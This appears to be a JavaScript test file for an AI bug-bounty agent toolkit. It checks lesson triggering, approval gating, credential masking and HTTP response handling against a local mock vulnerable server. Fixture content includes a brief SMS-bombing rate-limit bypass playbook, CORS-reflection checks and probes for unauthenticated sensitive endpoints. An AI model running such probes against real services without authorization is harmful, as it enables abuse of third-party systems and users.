  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const lessonBody = [
    "# 短信轰炸验证套路",
    "",
    "## 触发场景",
    "接口存在发送短信验证码能力且无频控。",
    "",
    "## 验证套路",
    "1) 抓发送接口 2) 重放观察频控 3) 换参绕过。",
    "",
    "## 收录标准",
    "一分钟内可重复触发 ≥5 条且下游真实送达。",
    "",
    "<!-- lesson-meta: " + JSON.stringify({ sessionId: "session-l62", vulnType: "短信轰炸", createdAt: Date.now(), triggers: { keywords: ["短信", "轰炸"] } }) + " -->",
    ""
  ].join("\n");
  await fsPromises.writeFile(nodePath.join(process.env.DSH_SRC_LESSONS_DIR, "sms-bomb-l62.md"), lessonBody);
  const h = harness();
  const parent = h.exec("l62lessons");
  await h.run("src_add_goal", { target: "https://lesson.test", objective: "注入验证", authorization: "t62b" }, parent);
  const state = await h.run("src_state", {}, parent);
  const hit = await h.run("src_add_intent", { title: "验证短信轰炸接口", detail: "", goalId: state.goal.id }, parent);
  assert.equal((hit.lessonHints ?? []).length, 2, "内置+沉淀同名经验都命中（触发器数据生效的最好证明）");
  assert.match(hit.lessonHints.join("\n"), /【经验库命中】短信轰炸验证套路.*src_read_lesson id="sms-bomb-l62"/, "沉淀经验带读取指引");
  assert.match(hit.lessonHints.join("\n"), /src_read_lesson id="sms-bomb"/, "内置 sms-bomb 同词命中");
  const miss = await h.run("src_add_intent", { title: "枚举子域名", detail: "", goalId: state.goal.id }, parent);
  assert.equal(miss.lessonHints, void 0, "未命中不带字段");
  // finalize：内置 submission-quality 声明了 tools=[src_finalize_engagement]，按工具名命中推送（收音标准自动到达）
  const fin = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [], allowIncomplete: true, allowIncompleteReason: "测试路径" }, parent);
  assert.match((fin.lessonHints ?? []).join("\n"), /src_read_lesson id="submission-quality"；tool=src_finalize_engagement/, "tools 声明在 finalize 决策点命中");
});

test("[local.62] src_record_lesson 声明触发器 → meta 落盘 → 后续决策点可命中", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("l62record");
  await h.run("src_add_goal", { target: "https://record.test", objective: "沉淀验证", authorization: "t62c" }, parent);
  const rec = await h.run("src_record_lesson", { vulnType: "CORS 反射套路", scenario: "Origin 反射", verificationPlaybook: "发双 Origin 头", acceptanceCriteria: "反射+credentials+敏感数据" , triggerTools: "src_add_intent", triggerKeywords: "cors,跨域" }, parent);
  assert.equal(rec.updatedExisting, false);
  const text = await fsPromises.readFile(rec.path, "utf8");
  const meta = JSON.parse(/<!-- lesson-meta: (\{.*?\}) -->/.exec(text)[1]);
  assert.deepEqual(meta.triggers, { tools: ["src_add_intent"], keywords: ["cors", "跨域"] }, "触发器进 meta");
  const state = await h.run("src_state", {}, parent);
  const hit = await h.run("src_add_intent", { title: "CORS 头反射验证", detail: "", goalId: state.goal.id }, parent);
  assert.equal((hit.lessonHints ?? []).length, 1, "沉淀后立刻可被决策点命中");
});

/* [local.65] 拆除 local.63 的 goal 级机械覆盖待办：枚举是 agent 本职（本机微信包扫描、下载反编译、
 * 测绘、被动侦察），开局就把枚举外包给用户是死编排。回归护栏：goal 创建零待办、返回无 coverageTodos
 * 字段；能力盘点、assetGaps 缺口软提示不受影响；agent 主动挂待办（src_user_todo）照常工作。 */
test("[local.65] goal 创建不再机械挂覆盖待办（枚举归 agent，待办归真用户动作）", async () => {
  const h = harness();
  const parentEvents = [];
  h.sessions.set("l65nocov", { append(type, data) { parentEvents.push({ type, data }); } }); /* 必须先注册再 exec：exec 闭包绑定的 append 就是收集器 */
  const parent = h.exec("l65nocov");
  const g1 = await h.run("src_add_goal", { target: "one-l65.test", objective: "零机械待办验证", authorization: "t65" }, parent);
  assert.equal(g1.coverageTodos, void 0, "返回无 coverageTodos 字段");
  assert.ok(Array.isArray(g1.capabilities), "能力盘点仍在（agent 自主选工具的牌面不受影响）");
  await h.run("src_add_goal", { target: "two-l65.test", objective: "再建一个" }, parent);
  const st = await h.run("src_state", {}, parent);
  assert.equal(st.counts.userTodos, 0, "goal 创建零待办");
  const todoEvents = parentEvents.filter((e) => e.type === "tool/call" && e.data.name === "src_user_todo");
  assert.equal(todoEvents.length, 0, "父日志零合成待办事件");
  assert.deepEqual(st.assetGaps.gaps, ["root-domain", "subdomain", "app", "mini-program"], "assetGaps 缺口软提示仍在");
  // agent 主动挂待办（真正需要用户的事）照常工作且进收官闸
  const todo = await h.run("src_user_todo", { title: "提供已登录 Burp 请求", detail: "认证会话用", kind: "burp-enable" }, parent);
  assert.match(todo.id, /^userTodo-/);
  const st2 = await h.run("src_state", {}, parent);
  assert.equal(st2.counts.userTodos, 1);
  assert.equal(st2.userTodos[0].kind, "burp-enable");
});

test("[local.63] src_state assetGaps：核心四类机械缺口（对照已登记资产）", async () => {
  const h = harness();
  const parent = h.exec("l63gap");
  h.sessions.set("l63gap", { append() {} });
  await h.run("src_add_goal", { target: "gap-l63.test", objective: "缺口验证" }, parent);
  const empty = await h.run("src_state", {}, parent);
  assert.deepEqual(empty.assetGaps.gaps, ["root-domain", "subdomain", "app", "mini-program"], "空图四类全缺");
  await h.run("src_add_asset", { type: "root-domain", value: "gap-l63.test", source: "目标" }, parent);
  await h.run("src_add_asset", { type: "subdomain", value: "api.gap-l63.test", source: "CT" }, parent);
  await h.run("src_add_asset", { type: "mini-program", value: "wx63test00000000", source: "枚举" }, parent);
  const st = await h.run("src_state", {}, parent);
  assert.deepEqual(st.assetGaps.gaps, ["app"], "仅剩 app 缺口");
  assert.deepEqual(st.assetGaps.present, [{ type: "root-domain", count: 1 }, { type: "subdomain", count: 1 }, { type: "mini-program", count: 1 }], "present 带计数");
  // 渲染层：src_state 文本里出现缺口注脚
  const tool = h.tools.get("src_state");
  const rendered = tool.output.render("", st).map((r) => r.text).join("");
  assert.match(rendered, /资产类缺口：app（先自行枚举登记/);
});

test("[local.63] scope 确认经验：关键词命中注入（工具不命中零噪音）", async () => {
  const { lessonsForContext } = await import("../lib/src/lessons.js");
  const scopeHits = await lessonsForContext({ tool: "src_add_intent", text: "测试海外 App 是否在收录范围", detail: "" });
  assert.equal(scopeHits.some((l) => l.file === "scope-confirmation"), true, "关键词「收录」命中 scope 确认经验");
  const noise = await lessonsForContext({ tool: "src_add_intent", text: "验证 CORS Origin 反射", detail: "" });
  assert.equal(noise.some((l) => l.file === "scope-confirmation"), false, "无关意图零噪音");
});

/* [local.66] toolFilter 对齐回归闸：hackone 会话（session-f64ff5b1）实测协议文本与运行时父代委派
   prompt 都点名 src_scan_surface（「已对子代理开放」「可用于批量预检」），但 recon/audit 的 deny
   列表把它拦死（子代理 4512125b 两次 unknown tool）。解禁后此闸防回退。 */
test("[local.66] recon/audit toolFilter 不得 deny src_scan_surface（prompt 与工具面对齐）", async () => {
  const { readFileSync } = await import("node:fs");
  const { resolve, dirname } = await import("node:path");
  const root = resolve(dirname(new URL(import.meta.url).pathname), "..");
  const text = readFileSync(resolve(root, "preset/src-hunter/agent.cordis.yml"), "utf8");
  const denyBlocks = [...text.matchAll(/deny:\s*\[([^\]]*)\]/g)].map((m) => new Set(m[1].split(",").map((s) => s.trim()).filter(Boolean)));
  assert.equal(denyBlocks.length >= 3, true, "至少应有 recon/audit/verify 三组 deny 列表");
  for (const deny of denyBlocks.slice(0, 2)) {
    assert.equal(deny.has("src_scan_surface"), false, "recon/audit 不得 deny src_scan_surface");
  }
});

/* ==================== [local.67 #19] 本地渗透靶场 ====================
 * 直击「155 测试全绿、实战产出为零」的盲区：现有测试验证代码不坏，靶场验证产出。
 * 靶场端点四类（tests/src.range.mjs）：①未授权可达敏感端点 ②缺 Content-Type 即 415 写入端点
 * ③写入→回读→删除零残留链 ④大响应/二进制/凭证回显（#17 防护与掩码素材）。
 * 本 commit 先落基建与烟测；行为断言随 #17/#18/#11b 各 commit 逐个挂上。 */
test("[local.67 靶场] 基建烟测：四类端点行为符合设计（415/写入回读删除/敏感返回/大响应）", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  try {
    /* ② 缺 Content-Type → 415；带头 → 200 succ:ok（§1.5 假阴性事故的端点级复刻） */
    const bare = await fetch(`${range.url}/api/v1/schedule/upload`, { method: "POST", body: JSON.stringify({ title: "t" }) });
    assert.equal(bare.status, 415, "JSON body 无 Content-Type 必须 415（复刻 Spring 行为）");
    const withHeader = await fetch(`${range.url}/api/v1/schedule/upload`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ title: "t" }) });
    assert.equal(withHeader.status, 200);
    assert.deepEqual((await withHeader.json()).succ, "ok");
    /* ③ 写入→回读→删除零残留 */
    const write = await fetch(`${range.url}/api/v1/notes`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ mark: "probe" }) });
    assert.equal(write.status, 201);
    const { id } = await write.json();
    const readBack = await fetch(`${range.url}/api/v1/notes/${id}`);
    assert.equal(readBack.status, 200);
    assert.deepEqual((await readBack.json()).data.mark, "probe");
    const del = await fetch(`${range.url}/api/v1/notes/${id}`, { method: "DELETE" });
    assert.equal(del.status, 204);
    assert.equal(range.db.records.has(id), false, "零残留：链路写入的记录已删干净（db 仅余 schedule/upload 那条独立写入）");
    assert.equal((await fetch(`${range.url}/api/v1/notes/${id}`)).status, 404);
    /* ① 未授权可达敏感端点 */
    const leak = await fetch(`${range.url}/api/v1/health/config`);
    assert.equal(leak.status, 200);
    const leakBody = await leak.json();
    assert.match(leakBody.data.secretKey, /^sk-live-/, "无认证即返回 secretKey（#11b 素材）");
    /* ④ 大响应/二进制/敏感字段返回 */
    const big = await fetch(`${range.url}/api/v1/export/big`);
    assert.equal((await big.text()).length > 20 * 1024, true);
    const img = await fetch(`${range.url}/api/v1/export/image`);
    assert.match(img.headers.get("content-type") ?? "", /image\/png/);
    const users = await fetch(`${range.url}/api/v1/users/query`);
    assert.match((await users.json()).data.sessionToken, /^tok-live-/);
  } finally { await range.close(); }
});

/* ==================== [local.67 #17] src_http/src_resolve_approval 响应体透传+四件防护 ==================== */
test("[local.67 #17-④] Content-Type 自动补全硬闸：JSON body 未带头自动补（放行 200），非 JSON 不补（415 保留）", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  const h = harness();
  const parent = h.exec("g67ct");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "#17-④ 硬闸" }, parent);
  try {
    const acct = await h.run("src_add_test_account", { label: "用户A", credential: "Cookie: sid=own-token-1; role=user" }, parent);
    /* JSON 形态 body、未显式带 Content-Type：自动补 application/json → 200（无硬闸时是 415 假阴性）。 */
    const ok = await h.run("src_http", { url: `${range.url}/api/v1/schedule/upload`, method: "POST", credentialRef: acct.credentialRef, body: '{"title":"probe"}', justification: "写排程验证自动补头" }, parent);
    assert.equal(ok.approval, "allowed-auto");
    assert.equal(ok.status, 200, "自动补 Content-Type 后 415 消灭");
    assert.equal(ok.contentTypeAutoAdded, true, "输出标注自动补头");
    assert.equal(range.db.records.size, 1, "写入确实落库（不再是盲发）");
    /* 非 JSON body（表单）：不自动补 → 415 保留（避免给表单错误强塞 application/json 的另一种假阴性）。 */
    const form = await h.run("src_http", { url: `${range.url}/api/v1/schedule/upload`, method: "POST", credentialRef: acct.credentialRef, body: "a=1&b=2", justification: "表单写入不自动补头" }, parent);
    assert.equal(form.status, 415, "非 JSON body 不补头，415 行为保留");
    assert.equal(form.contentTypeAutoAdded, void 0);
  } finally { await range.close(); }
});
test("[local.67 #17] 响应体透传：敏感端点 body 可见 + 截断 2KB + full 强制完整 + 二进制只回长度", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  const h = harness();
  const parent = h.exec("g67body");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "#17 body 透传" }, parent);
  try {
    /* 未授权可达敏感端点：body 里能看到 secretKey（§1.5 之前只能看到 200）。 */
    const leak = await h.run("src_http", { url: `${range.url}/api/v1/health/config`, method: "GET", justification: "诊断端点探测" }, parent);
    assert.equal(leak.approval, "allowed-auto");
    assert.match(leak.responseBody, /sk-live-0123456789abcdef/, "响应体透传：secretKey 可见");
    /* 大响应：默认 2KB 截断；full:true 完整。 */
    const big = await h.run("src_http", { url: `${range.url}/api/v1/export/big`, method: "GET", justification: "大响应截断" }, parent);
    assert.equal(big.truncated, true);
    assert.ok(big.responseBody.length < 2400, `截断后长度受控（实际 ${big.responseBody.length}）`);
    assert.match(big.responseBody, /\[截断\]/, "截断注脚");
    const bigFull = await h.run("src_http", { url: `${range.url}/api/v1/export/big`, method: "GET", justification: "full 强制完整", full: true }, parent);
    assert.equal(bigFull.truncated, void 0);
    assert.ok(bigFull.responseBody.length > 20 * 1024, "full:true 返回完整 body");
    /* 二进制：只回长度不透传内容。 */
    const img = await h.run("src_http", { url: `${range.url}/api/v1/export/image`, method: "GET", justification: "二进制只回长度" }, parent);
    assert.match(img.responseBody, /非 text\/json 类，共 4096 字节/, "二进制只回长度");
    assert.doesNotMatch(img.responseBody, /[\x00-\x08\x0e-\x1f]/, "无二进制垃圾字符");
  } finally { await range.close(); }
});
test("[local.67 #17] 响应哈希去重：同 host+method+path 完全相同响应第二次只回 hash；full:true 强制；不同响应不误吞", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  const h = harness();
  const parent = h.exec("g67dedup");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "#17 去重" }, parent);
  try {
    const first = await h.run("src_http", { url: `${range.url}/api/v1/status`, method: "GET", justification: "状态探测一" }, parent);
    assert.match(first.responseBody, /"succ":"ok"/, "第一次完整透传");
    const second = await h.run("src_http", { url: `${range.url}/api/v1/status`, method: "GET", justification: "状态探测二（去重）" }, parent);
    assert.equal(second.deduped, true, "相同响应第二次去重");
    assert.match(second.responseBody, /\[响应体去重\]/);
    assert.doesNotMatch(second.responseBody, /"succ":"ok"/, "不重复注入 body");
    const forced = await h.run("src_http", { url: `${range.url}/api/v1/status`, method: "GET", justification: "full 强制", full: true }, parent);
    assert.equal(forced.deduped, void 0);
    assert.match(forced.responseBody, /"succ":"ok"/, "full:true 强制完整");
    /* 关键场景：写入后回读，两次响应不同——绝不能误吞（越权验证的关键信号）。 */
    const acct = await h.run("src_add_test_account", { label: "用户A", credential: "Cookie: sid=own-token-2" }, parent);
    const write = await h.run("src_http", { url: `${range.url}/api/v1/notes`, method: "POST", credentialRef: acct.credentialRef, body: '{"mark":"dedup-check"}', justification: "写入" }, parent);
    const recId = /rec-\d+/.exec(write.responseBody)?.[0];
    assert.ok(recId, "写入响应透传出 id");
    const readBack = await h.run("src_http", { url: `${range.url}/api/v1/notes/${recId}`, method: "GET", justification: "回读" }, parent);
    assert.match(readBack.responseBody, /dedup-check/, "回读内容可见（不同响应不去重）");
  } finally { await range.close(); }
});
test("[local.67 #17] 凭证掩码：echo 回显的认证头值与 Bearer 形态均打 <stored>，不落会话明文", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  const h = harness();
  const parent = h.exec("g67mask");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "#17 掩码" }, parent);
  try {
    const acct = await h.run("src_add_test_account", { label: "用户A", credential: "Cookie: sid=maskme-secret-9876" }, parent);
    const echo = await h.run("src_http", { url: `${range.url}/api/v1/echo/headers`, method: "GET", credentialRef: acct.credentialRef, justification: "回显验证掩码" }, parent);
    assert.doesNotMatch(echo.responseBody, /maskme-secret-9876/, "回显的凭证值已掩码");
    assert.match(echo.responseBody, /<stored>/, "掩码标记在场");
    /* 掩码不能吞越权证据：PII 形态（手机号/身份证）不掩。 */
    const users = await h.run("src_http", { url: `${range.url}/api/v1/users/query`, method: "GET", justification: "敏感字段可见性" }, parent);
    assert.match(users.responseBody, /13800001111/, "手机号证据保留（越权取证的实体）");
  } finally { await range.close(); }
});
test("[local.67 #17] 重放透传（主修点）：未授权写挂起→allow 重放→responseBody 可见+落库+投影同步", async () => {
  const { createRange } = await import("./src.range.mjs");
  const range = await createRange();
  const h = harness();
  const parent = h.exec("g67replay");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "#17 重放透传" }, parent);
  try {
    /* 无认证头 + POST + 非读语义 → 挂起。挂起阶段硬闸已把 Content-Type 存进待审行。 */
    const pending = await h.run("src_http", { url: `${range.url}/api/v1/notes`, method: "POST", body: '{"mark":"replay-probe"}', justification: "未授权写入探测" }, parent);
    assert.equal(pending.approval, "pending");
    assert.equal(range.db.records.size, 0, "挂起未发出");
    const approved = await h.run("src_resolve_approval", { id: pending.pendingApprovalId, action: "allow", note: "验证重放" }, parent);
    assert.equal(approved.status, "approved");
    assert.equal(approved.responseStatus, 201, "重放收到 201（Content-Type 经挂起行/重放侧双保险）");
    assert.match(approved.responseBody, /rec-\d+/, "重放响应体透传（此前只有状态码）");
    /* 落库：responseBody 随待审行持久化；src_state 投影行也带 responseBody。 */
    const state = await h.run("src_state", {}, parent);
    const row = state.pendingApprovals.find((r) => r.id === pending.pendingApprovalId);
    assert.equal(row.status, "approved");
    assert.match(row.responseBody ?? "", /rec-\d+/, "投影行带 responseBody");
    assert.equal(range.db.records.size, 1, "写入落库可回读验证");
  } finally { await range.close(); }
});
